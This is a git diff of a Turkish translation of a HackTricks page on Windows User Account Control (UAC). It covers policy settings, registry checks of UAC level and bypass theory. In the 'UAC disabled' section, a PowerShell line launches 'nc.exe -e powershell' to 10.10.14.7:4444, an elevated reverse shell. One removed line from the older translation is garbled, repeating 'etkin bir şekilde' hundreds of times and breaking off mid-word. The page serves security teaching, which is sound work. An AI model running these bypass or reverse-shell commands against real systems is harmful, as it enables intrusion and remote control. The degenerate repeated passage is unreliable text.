@@ -1,88 +1,103 @@
 # UAC - Kullanıcı Hesabı Kontrolü
 
+{% hint style="success" %}
+AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme becerilerini öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerine göz atın**](https://peass.creator-spring.com)
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) veya [**telegram grubumuza**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş topluluk araçları** tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## UAC
 
-[Kullanıcı Hesabı Kontrolü (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), yükseltilmiş faaliyetler için bir **izin istemi** sağlayan bir özelliktir. Uygulamalar farklı `bütünlük` seviyelerine sahiptir ve yüksek seviyede bir program, **sistemi potansiyel olarak tehlikeye atabilecek görevleri gerçekleştirebilir**. UAC etkinleştirildiğinde, uygulamalar ve görevler her zaman bir yönetici tarafından bu uygulamaların/görevlerin sisteme yönetici düzeyinde erişim sağlaması için açıkça yetkilendirilmediği sürece, her zaman bir yönetici olmayan hesabın güvenlik bağlamında çalışır. Bu, yöneticileri istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir ancak bir güvenlik sınırı olarak kabul edilmez.
+[Kullanıcı Hesabı Kontrolü (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş aktiviteler için onay istemi** sağlayan bir özelliktir. Uygulamalar farklı `bütünlük` seviyelerine sahiptir ve **yüksek seviyeye** sahip bir program, **sistemi potansiyel olarak tehlikeye atabilecek** görevleri yerine getirebilir. UAC etkinleştirildiğinde, uygulamalar ve görevler her zaman **bir yönetici hesabının güvenlik bağlamında çalışır**; yönetici, bu uygulamaların/görevlerin sisteme yönetici düzeyinde erişim izni almasını açıkça yetkilendirmedikçe. Bu, yöneticileri istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir, ancak bir güvenlik sınırı olarak kabul edilmez.
 
-Daha fazla bütünlük seviyeleri hakkında bilgi için:
+Bütünlük seviyeleri hakkında daha fazla bilgi için:
 
 {% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
-[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
+[bütünlük-seviyeleri.md](../windows-local-privilege-escalation/integrity-levels.md)
 {% endcontent-ref %}
 
-UAC devredeyken, bir yönetici kullanıcıya 2 belirteç verilir: düzenli düzeydeki işlemleri düzenli düzeyde gerçekleştirmek için standart bir kullanıcı anahtarı ve yönetici ayrıcalıkları olan bir belirteç.
+UAC uygulandığında, bir yönetici kullanıcıya 2 jeton verilir: standart bir kullanıcı anahtarı, normal seviyede düzenli işlemler yapmak için ve yönetici ayrıcalıkları olan bir jeton.
 
-Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), UAC'nin nasıl çalıştığıyla ilgili detaylı bilgileri içerir ve oturum açma işlemi, kullanıcı deneyimi ve UAC mimarisini içerir. Yöneticiler, yerel düzeyde (secpol.msc kullanarak) UAC'nin nasıl çalışacağını kuruluşlarına özgü olarak yapılandırmak için güvenlik politikalarını kullanabilir veya etkin bir şekilde yapılandırabilir ve etkin bir şekilde etkin bir şekilde yapılandırabilir ve etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde et
+Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), UAC'nin nasıl çalıştığını derinlemesine tartışmakta ve oturum açma süreci, kullanıcı deneyimi ve UAC mimarisini içermektedir. Yöneticiler, UAC'nin kendi organizasyonlarına özgü nasıl çalıştığını yerel düzeyde (secpol.msc kullanarak) veya bir Active Directory alan ortamında Grup Politika Nesneleri (GPO) aracılığıyla yapılandırıp dağıtmak için güvenlik politikalarını kullanabilirler. Çeşitli ayarlar detaylı olarak [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) tartışılmaktadır. UAC için ayarlanabilecek 10 Grup Politika ayarı vardır. Aşağıdaki tablo ek detaylar sağlamaktadır:
+
+| Grup Politika Ayarı                                                                                                                                                                                                                                                                                                                                                           | Kayıt Anahtarı              | Varsayılan Ayar                                              |
+| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
+| [Kullanıcı Hesabı Kontrolü: Yerleşik Yönetici hesabı için Yönetici Onay Modu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Devre Dışı                                                  |
+| [Kullanıcı Hesabı Kontrolü: UIAccess uygulamalarının güvenli masaüstünü kullanmadan yükseltme istemesi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Devre Dışı                                                  |
+| [Kullanıcı Hesabı Kontrolü: Yönetici Onay Modu'ndaki yöneticiler için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Windows dışı ikili dosyalar için onay istemi               |
+| [Kullanıcı Hesabı Kontrolü: Standart kullanıcılar için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Güvenli masaüstünde kimlik bilgileri istemi                 |
+| [Kullanıcı Hesabı Kontrolü: Uygulama kurulumlarını tespit et ve yükseltme istemi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Etkin (ev için varsayılan) Devre Dışı (kurumsal için varsayılan) |
+| [Kullanıcı Hesabı Kontrolü: Sadece imzalanmış ve doğrulanmış yürütülebilir dosyaları yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Devre Dışı                                                  |
+| [Kullanıcı Hesabı Kontrolü: Sadece güvenli konumlarda kurulu UIAccess uygulamalarını yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Etkin                                                      |
+| [Kullanıcı Hesabı Kontrolü: Tüm yöneticileri Yönetici Onay Modu'nda çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Etkin                                                      |
+| [Kullanıcı Hesabı Kontrolü: Yükseltme istemi sırasında güvenli masaüstüne geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Etkin                                                      |
+| [Kullanıcı Hesabı Kontrolü: Dosya ve kayıt defteri yazma hatalarını kullanıcıya özel konumlara sanallaştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Etkin                                                      |
+
 ### UAC Atlatma Teorisi
 
-Bazı programlar, **kullanıcının** **yönetici grubuna ait olduğu** takdirde **otomatik olarak yükseltilir**. Bu ikili dosyaların içindeki _**Manifestolar**_ içinde _**autoElevate**_ seçeneği **True** değeriyle bulunur. Ayrıca ikili dosyanın **Microsoft tarafından imzalanmış** olması gerekir.
+Bazı programlar, **kullanıcı yönetici grubuna ait** ise **otomatik olarak yükseltilir**. Bu ikili dosyaların içinde _**Manifests**_ kısmında _**autoElevate**_ seçeneği _**True**_ değeri ile bulunur. İkili dosya ayrıca **Microsoft tarafından imzalanmış** olmalıdır.
 
-Ardından, **UAC**'yi atlamak (**orta** bütünlük seviyesinden **yüksek** seviyeye yükseltmek) için bazı saldırganlar, bu tür ikili dosyaları kullanarak **keyfi kodları yürütmeyi** tercih ederler çünkü bu kodlar **yüksek seviye bütünlük işleminden** yürütülecektir.
+Sonra, **UAC'yi atlatmak** ( **orta** bütünlük seviyesinden **yüksek** seviyeye yükseltmek) için bazı saldırganlar bu tür ikili dosyaları **rastgele kod çalıştırmak** için kullanır çünkü bu, **Yüksek seviye bütünlük sürecinden** çalıştırılacaktır.
 
-Bir ikili dosyanın _**Manifestosunu**_ kontrol etmek için Sysinternals'ten gelen _**sigcheck.exe**_ aracını kullanabilirsiniz. Ve işlemlerin **bütünlük seviyesini** görmek için _Process Explorer_ veya _Process Monitor_ (Sysinternals'ten) kullanabilirsiniz.
+Bir ikilinin _**Manifest**_ dosyasını _**sigcheck.exe**_ aracını kullanarak kontrol edebilirsiniz. Ve süreçlerin **bütünlük seviyesini** _Process Explorer_ veya _Process Monitor_ (Sysinternals) kullanarak **görebilirsiniz**.
 
 ### UAC'yi Kontrol Et
 
-UAC'nin etkin olup olmadığını doğrulamak için yapılacaklar:
+UAC'nin etkin olup olmadığını doğrulamak için:
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-Eğer **`1`** ise, UAC **etkinleştirilmiştir**, eğer **`0`** veya **mevcut değilse**, o zaman UAC **etkisizdir**.
+Eğer **`1`** ise UAC **etkin**, eğer **`0`** ise veya **mevcut değilse**, UAC **etkisiz**dir.
 
-Ardından, yapılandırılmış **hangi seviye**'nin kontrol edilmesi:
+Sonra, **hangi seviye** yapılandırıldığını kontrol edin:
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
-* Eğer **`0`** ise, UAC soru sormaz (engellenmiş gibi)
-* Eğer **`1`** ise yöneticiye yüksek haklarla bir uygulamayı çalıştırmak için kullanıcı adı ve şifre sorulur (Güvenli Masaüstü üzerinde)
-* Eğer **`2`** (**Her zaman bildir**) UAC her zaman yöneticiye bir şeyi yüksek ayrıcalıklarla çalıştırmaya çalıştığında onayını sorar (Güvenli Masaüstü üzerinde)
-* Eğer **`3`** ise `1` gibi ancak Güvenli Masaüstü üzerinde gerekli değil
-* Eğer **`4`** ise `2` gibi ancak Güvenli Masaüstü üzerinde gerekli değil
-* Eğer **`5`** (**varsayılan**) yöneticiye Windows dışı uygulamaları yüksek ayrıcalıklarla çalıştırmak için onayını sormak için sorar
+* Eğer **`0`** ise, UAC istemi olmayacak (gibi **devre dışı**)
+* Eğer **`1`** ise, yönetici **kullanıcı adı ve şifre** istenir yüksek haklarla ikili dosyayı çalıştırmak için (Güvenli Masaüstünde)
+* Eğer **`2`** ise (**Her zaman beni bilgilendir**) UAC, yönetici yüksek ayrıcalıklarla bir şey çalıştırmaya çalıştığında her zaman onay isteyecektir (Güvenli Masaüstünde)
+* Eğer **`3`** ise `1` gibi ama Güvenli Masaüstünde gerekli değil
+* Eğer **`4`** ise `2` gibi ama Güvenli Masaüstünde gerekli değil
+* Eğer **`5`** ise (**varsayılan**) yöneticiye yüksek ayrıcalıklarla Windows dışı ikili dosyaları çalıştırmak için onay isteyecektir
 
-Sonra, **`LocalAccountTokenFilterPolicy`** değerine bakmanız gerekmektedir.\
-Eğer değer **`0`** ise, sadece **RID 500** kullanıcısı (**yerleşik Yönetici**) UAC olmadan **yönetici görevlerini gerçekleştirebilir**, ve eğer `1` ise, **"Yöneticiler"** grubundaki tüm hesaplar bunları yapabilir.
+Sonra, **`LocalAccountTokenFilterPolicy`** değerine bakmalısınız\
+Eğer değer **`0`** ise, yalnızca **RID 500** kullanıcısı (**yerleşik Yönetici**) **UAC olmadan yönetici görevlerini** yerine getirebilir ve eğer `1` ise, **"Yöneticiler"** grubundaki **tüm hesaplar** bunları yapabilir.
 
-Ve son olarak **`FilterAdministratorToken`** anahtarının değerine bakın.\
-Eğer **`0`**(varsayılan), **yerleşik Yönetici hesabı** uzaktan yönetim görevlerini yapabilir ve eğer **`1`** ise yerleşik Yönetici hesabı uzaktan yönetim görevlerini yapamaz, `LocalAccountTokenFilterPolicy` `1` olarak ayarlanmadıkça.
+Ve son olarak **`FilterAdministratorToken`** anahtarının değerine bakın\
+Eğer **`0`** (varsayılan), **yerleşik Yönetici hesabı** uzaktan yönetim görevlerini yapabilir ve eğer **`1`** ise, yerleşik Yönetici hesabı uzaktan yönetim görevlerini **yapamaz**, `LocalAccountTokenFilterPolicy` `1` olarak ayarlanmadıkça.
 
 #### Özet
 
-* Eğer `EnableLUA=0` veya **mevcut değilse**, **hiç kimse için UAC yok**
-* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=1` ise, Hiç kimse için UAC yok**
-* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=0`, RID 500 için (Yerleşik Yönetici) UAC yok**
+* Eğer `EnableLUA=0` veya **yoksa**, **hiç kimse için UAC yok**
+* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=1` , Hiç kimse için UAC yok**
+* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=0`, RID 500 için UAC yok (Yerleşik Yönetici)**
 * Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=1`, Herkes için UAC var**
 
 Tüm bu bilgiler **metasploit** modülü kullanılarak toplanabilir: `post/windows/gather/win_privs`
 
-Ayrıca kullanıcı gruplarınızı kontrol edebilir ve bütünlük seviyesini alabilirsiniz:
+Kullanıcınızın gruplarını kontrol edebilir ve bütünlük seviyesini alabilirsiniz:
 ```
 net user %username%
 whoami /groups | findstr Level
@@ -90,32 +105,32 @@ whoami /groups | findstr Level
 ## UAC atlatma
 
 {% hint style="info" %}
-Not: Eğer kurbanın grafik erişimi varsa, UAC atlatması oldukça basittir çünkü UAC uyarısı çıktığında sadece "Evet"e tıklamanız yeterlidir.
+Kurbanın grafik erişimine sahipseniz, UAC atlatma oldukça basittir çünkü UAC istemi göründüğünde "Evet"e tıklamanız yeterlidir.
 {% endhint %}
 
-UAC atlatması aşağıdaki durumda gereklidir: **UAC etkinleştirilmişse, işleminiz orta bütünlük bağlamında çalışıyorsa ve kullanıcı grubunuz yöneticiler grubuna aitse**.
+UAC atlatma, aşağıdaki durumda gereklidir: **UAC etkin, işleminiz orta bütünlük bağlamında çalışıyor ve kullanıcınız yöneticiler grubuna ait.**
 
-**UAC'nin en yüksek güvenlik seviyesinde (Her zaman) olduğunda atlatmak, diğer seviyelerden (Varsayılan) herhangi birinde olduğunda atlatmaktan çok daha zordur.**
+UAC'nın **en yüksek güvenlik seviyesinde (Her Zaman) atlatmanın, diğer seviyelerden (Varsayılan) çok daha zor olduğunu** belirtmek önemlidir.
 
 ### UAC devre dışı
 
-Eğer UAC zaten devre dışı bırakılmışsa (`ConsentPromptBehaviorAdmin` **`0`**) şunun gibi bir şey kullanarak **yönetici ayrıcalıklarıyla (yüksek bütünlük seviyesi) ters kabuk çalıştırabilirsiniz**:
+Eğer UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**) **yönetici ayrıcalıklarıyla bir ters kabuk çalıştırabilirsiniz** (yüksek bütünlük seviyesi) gibi bir şey kullanarak:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-#### Token çoğaltma ile UAC atlatma
+#### UAC atlatma ile token kopyalama
 
